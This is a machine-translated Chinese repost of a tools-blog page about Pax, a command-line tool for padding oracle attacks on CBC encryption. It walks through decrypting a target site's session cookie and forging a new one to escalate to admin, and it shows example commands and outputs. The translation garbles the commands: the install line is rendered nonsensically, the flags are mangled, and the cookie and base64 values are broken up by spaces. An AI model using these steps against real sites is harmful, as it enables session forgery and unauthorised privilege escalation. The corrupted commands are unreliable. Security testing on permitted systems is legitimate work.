# Pax:用于 PKCS7 填充 Oracle 攻击的 CLI 工具

> 原文：<https://kalilinuxtutorials.com/pax/>

[![](img/dec04b68a6731209fb62289011324068.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfYv4bNXaisG2Y_EOZ5liEeM0gJYm5bTt2quJcAaBPC0JgVd6hFNZuE5O88QqlMF9BuuesR8Cczm6EAEUd7OiZL62lnFWUn5yHh7my7hcOavikLxDc-DK7YGFd5ivDQ-cnZ3zDPrN_CJLKNlUQfvhp2XvxBAZgxur-P8qo7PlmhwuAjY0Yww830Hun/s728/pax%20(1).png)

**Pax** ，利用填充神谕取乐牟利！

Pax(填充 oracle eXploiter)是一个利用填充 oracle 的工具，目的是:

*   获取给定的 CBC 加密数据的明文。
*   使用 oracle 使用的未知加密算法获取给定明文的加密字节。

这可用于泄露加密的会话信息，通常可用于绕过身份验证、提升权限以及通过加密自定义明文并将其写回服务器来远程执行代码。

与往常一样，该工具只应在您拥有和/或有权探测的系统上使用！

## 安装

从版本下载，或使用 Go 安装:

**去 github.com/liamg/pax/cmd/pax 吧**

## 用法示例

如果您发现一个可疑的 oracle，其中加密的数据存储在一个名为`**SESS**`的 cookie 中，您可以使用以下命令:

**Pax decrypt–URL https://target.site/profile.php–sample gw3g8e 3 EJ 4 ai 9 wffn % 2 FD 0 urqkzyapfm 2 ufq % 2 F8 dw mow 4 nykzhx 07 BG % 3D % 3D–block-size 16–cookie " SESS = gw3g8e 3 EJ 4 ai 9 wffn % 2 FD 0 urqkzyapfm 2 ufq % 2 F8 dwmow 4 nykzhx 07 BG % 3D % 3D "**

这将有望给您一些明文，可能类似于:

**{ "用户 id": 456，" is_admin": false}**

看起来你可以提升你在这里的特权！

您可以尝试这样做，首先生成您自己的加密数据，oracle 会将这些数据解密为一些偷偷摸摸的明文:

**Pax encrypt URL https://target . site/profile . PHP–sample GW 3kg 8 E3 EJ 4 ai 9 wffn % 2 FD 0 urqzyf2f 2 ufq % 8dwmow 4 wnyzhx 07 BG % 3d–block-size 16–cookies–plain-text 456，**

这将产生另一组 base64 编码的加密数据，可能类似于:

**dghpcybpcybqdxn 0 igfuigv 4 yw1 wbgu =**

现在，您可以打开浏览器，将`**SESS**` cookie 的值设置为上面的值。加载原始的 oracle 页面，您现在应该看到您被提升到管理员级别。

[**Download**](https://github.com/liamg/pax)